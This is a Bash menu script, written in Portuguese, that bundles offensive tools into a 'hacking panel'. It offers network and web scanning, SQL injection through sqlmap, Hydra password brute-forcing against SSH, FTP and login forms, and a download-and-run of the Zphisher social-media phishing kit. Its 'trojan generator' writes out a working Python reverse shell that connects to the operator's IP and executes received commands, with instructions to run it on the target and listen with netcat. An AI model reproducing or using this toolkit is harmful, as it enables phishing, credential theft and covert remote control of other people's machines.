Copy
#!/bin/bash

# Cores para o terminal
VERMELHO='\033[0;31m'
VERDE='\033[0;32m'
AMARELO='\033[1;33m'
AZUL='\033[0;34m'
ROXO='\033[0;35m'
CIANO='\033[0;36m'
BRANCO='\033[1;37m'
COR_PADRAO='\033[0m'
NEGrito='\033[1m'

# Verifica se é root (recomendado)
if [[ $EUID -ne 0 ]]; then
   echo -e "${AMARELO}Nota: Algumas ferramentas funcionam melhor como root.${COR_PADRAO}"
fi

function limpar_tela() {
    clear
}

function cabecalho() {
    echo -e "${AZUL}╔══════════════════════════════════════════════════╗${COR_PADRAO}"
    echo -e "${AZUL}║${BRANCO}${NEGrito}      PAINEL DE ENGENHARIA & HACKING V2            ${COR_PADRAO}${AZUL}║${COR_PADRAO}"
    echo -e "${AZUL}╚══════════════════════════════════════════════════╝${COR_PADRAO}"
    echo -e "${VERDE}-------------------------------------------------${COR_PADRAO}"
    echo -e "${BRANCO} 1. ${AMARELO}Nmap - Scanner de Redes e Portas${COR_PADRAO}"
    echo -e "${BRANCO} 2. ${AMARELO}Nikto - Scanner de Vulnerabilidades Web${COR_PADRAO}"
    echo -e "${BRANCO} 3. ${AMARELO}SQLmap - Injeção SQL Automática${COR_PADRAO}"
    echo -e "${BRANCO} 4. ${AMARELO}Zphisher - Phishing de Redes Sociais${COR_PADRAO}"
    echo -e "${BRANCO} 5. ${AMARELO}Whois - Informações de Domínio${COR_PADRAO}"
    echo -e "${BRANCO} 6. ${AMARELO}Netdiscover - Descoberta de Hosts (LAN)${COR_PADRAO}"
    echo -e "${BRANCO} 7. ${AMARELO}Dirb - Scanner de Arquivos Ocultos${COR_PADRAO}"
    echo -e "${BRANCO} 8. ${AMARELO}Hydra - Brute Force de Senhas${COR_PADRAO}"
    echo -e "${BRANCO} 9. ${AMARELO}Gerador de Trojan (Python)${COR_PADRAO}"
    echo -e "${BRANCO} 0. ${VERMELHO}Sair${COR_PADRAO}"
    echo -e "${VERDE}-------------------------------------------------${COR_PADRAO}"
}

function executar_ou_tra() {
    if command -v $1 &> /dev/null; then
        $@
    else
        echo -e "${VERMELHO}Erro: O comando '$1' não está instalado.${COR_PADRAO}"
        echo -e "${AMARELO}Instale-o com: sudo apt install $1${COR_PADRAO}"
    fi
    read -n 1 -p "Pressione Enter para continuar..."
    limpar_tela
}

# --- Funções Antigas ---

function menu_nmap() {
    limpar_tela
    echo -e "${CIANO}Digite o IP ou Domínio:${COR_PADRAO}"
    read -p "Alvo: " ALVO
    if [ -z "$ALVO" ]; then read -n 1; return; fi
    echo -e "${AZUL}Escolha o scan:${COR_PADRAO}"
    echo "1. Rápido 2. Completo (Serviços/OS) 3. Agressivo"
    read -p "Opção: " OPCAO
    if [ "$OPCAO" == "1" ]; then executar_ou_tra nmap "$ALVO"
    elif [ "$OPCAO" == "2" ]; then executar_ou_tra nmap -sS -sV -O "$ALVO"
    elif [ "$OPCAO" == "3" ]; then executar_ou_tra nmap -A "$ALVO"
    else echo -e "${VERMELHO}Opção inválida.${COR_PADRAO}"; read -n 1; fi
    limpar_tela
}

function menu_nikto() {
    limpar_tela
    echo -e "${CIANO}URL completa (ex: http://192.168.1.100):${COR_PADRAO}"
    read -p "URL: " URL
    if [ -z "$URL" ]; then read -n 1; return; fi
    executar_ou_tra nikto -h "$URL"
}

function menu_sqlmap() {
    limpar_tela
    echo -e "${CIANO}URL com parâmetro (ex: page.php?id=1):${COR_PADRAO}"
    read -p "URL: " URL
    if [ -z "$URL" ]; then read -n 1; return; fi
    executar_ou_tra sqlmap -u "$URL" --batch --random-agent
}

function menu_zphisher() {
    limpar_tela
    if [ -d "zphisher" ]; then EXEC_ZPH="zphisher"
    elif command -v git &> /dev/null; then
        echo -e "${AMARELO}Baixando Zphisher...${COR_PADRAO}"
        git clone https://github.com/htr-tech/zphisher.git 2>/dev/null
        EXEC_ZPH="./zphisher/zphisher"
    else
        echo -e "${VERMELHO}Git não encontrado.${COR_PADRAO}"; read -n 1; return
    fi
    bash "$EXEC_ZPH"
    read -n 1
    limpar_tela
}

function menu_whois() {
    limpar_tela
    echo -e "${CIANO}Domínio (ex: google.com):${COR_PADRAO}"
    read -p "Domínio: " DOMINIO
    if [ -z "$DOMINIO" ]; then read -n 1; return; fi
    executar_ou_tra whois "$DOMINIO"
}

function menu_netdiscover() {
    limpar_tela
    echo -e "${CIANO}Escaneando rede local...${COR_PADRAO}"
    if command -v netdiscover &> /dev/null; then
        sudo netdiscover -r 192.168.1.0/24 2>/dev/null || netdiscover -r 10.0.0.0/8
    else
        echo -e "${VERMELHO}Netdiscover não instalado.${COR_PADRAO}"
    fi
    read -n 1
    limpar_tela
}

# --- NOVAS FUNÇÕES ---

function menu_dirb() {
    limpar_tela
    echo -e "${CIANO}URL para escanear (ex: http://site.com):${COR_PADRAO}"
    read -p "URL: " URL
    if [ -z "$URL" ]; then read -n 1; return; fi
    echo -e "${VERDE}Executando Dirb...${COR_PADRAO}"
    # O dirb cria um arquivo de saída com resultados
    executar_ou_tra dirb "$URL" /usr/share/dirb/wordlists/common.txt
}

function menu_hydra() {
    limpar_tela
    echo -e "${CIANO}1. SSH  2. FTP  3. HTTP-FORM${COR_PADRAO}"
    read -p "Serviço: " SERVICO
    
    if [ "$SERVICO" == "1" ]; then
        echo -e "${AMARELO}Digite o IP do alvo:${COR_PADRAO}"
        read -p "IP: " ALVO
        echo -e "${AMARELO}Digite o nome de usuário:${COR_PADRAO}"
        read -p "User: " USUARIO
        echo -e "${AMARELO}Caminho para o arquivo de senhas (wordlist):${COR_PADRAO}"
        read -p "Wordlist (ex: /usr/share/wordlists/rockyou.txt): " WL
        
        if [ -z "$ALVO" ] || [ -z "$USUARIO" ]; then read -n 1; return; fi
        
        echo -e "${VERDE}Iniciando Hydra SSH...${COR_PADRAO}"
        executar_ou_tra hydra -l "$USUARIO" -P "$WL" "$ALVO" ssh
        
    elif [ "$SERVICO" == "2" ]; then
        echo -e "${AMARELO}Digite o IP do alvo:${COR_PADRAO}"
        read -p "IP: " ALVO
        echo -e "${AMARELO}Caminho para o wordlist:${COR_PADRAO}"
        read -p "Wordlist: " WL
        executar_ou_tra hydra -l admin -P "$WL" "$ALVO" ftp
        
    elif [ "$SERVICO" == "3" ]; then
        echo -e "${AMARELO}URL do formulário (ex: http://site.com/login.php):${COR_PADRAO}"
        read -p "URL: " URL
        echo -e "${AMARELO}User e Wordlist:${COR_PADRAO}"
        read -p "User: " USUARIO
        read -p "Wordlist: " WL
        executar_ou_tra hydra -l "$USUARIO" -P "$WL" -F "$URL" http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
    else
        echo -e "${VERMELHO}Opção inválida.${COR_PADRAO}"
    fi
    read -n 1
    limpar_tela
}

function menu_trojan() {
    limpar_tela
    echo -e "${CIANO}Gerador de Trojan Simples (Python)${COR_PADRAO}"
    echo -e "${AMARELO}Este script gera um .py que se conecta ao seu IP.${COR_PADRAO}"
    
    echo -e "${AMARELO}Seu IP (ou IP do VPS/CNC):${COR_PADRAO}"
    read -p "IP: " LIP
    echo -e "${AMARELO}Porta de conexão:${COR_PADRAO}"
    read -p "Porta: " LPORT

    # Cria o script Python
    echo -e "${VERDE}Gerando trojan.py...${COR_PADRAO}"
    cat > trojan.py << EOF
import socket, subprocess, os

HOST = "$LIP"
PORT = $LPORT

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

while True:
    cmd = s.recv(1024).decode()
    if cmd == "quit":
        break
    try:
        output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        s.send((output.stdout + output.stderr).encode())
    except Exception as e:
        s.send(str(e).encode())

s.close()
EOF

    echo -e "${VERDE}Trojan gerado como 'trojan.py'.${COR_PADRAO}"
    echo -e "${AMARELO}Para usar, execute: python3 trojan.py no alvo."
    echo -e "${AMARELO}No seu computador (CNC), use: nc -lvp $LPORT"
    read -n 1
    limpar_tela
}

# Loop principal
while true; do
    cabecalho
    echo -ne "${BRANCO}Selecione uma opção: ${COR_PADRAO}"
    read -p "OPÇÃO: " ESCOLHA

    case $ESCOLHA in
        1) menu_nmap ;;
        2) menu_nikto ;;
        3) menu_sqlmap ;;
        4) menu_zphisher ;;
        5) menu_whois ;;
        6) menu_netdiscover ;;
        7) menu_dirb ;;
        8) menu_hydra ;;
        9) menu_trojan ;;
        0) 
            echo -e "${VERDE}Saindo...${COR_PADRAO}"
            exit 0
            ;;
        *) 
            echo -e "${VERMELHO}Opção inválida!${COR_PADRAO}"
            read -n 1
            ;;
    esac
done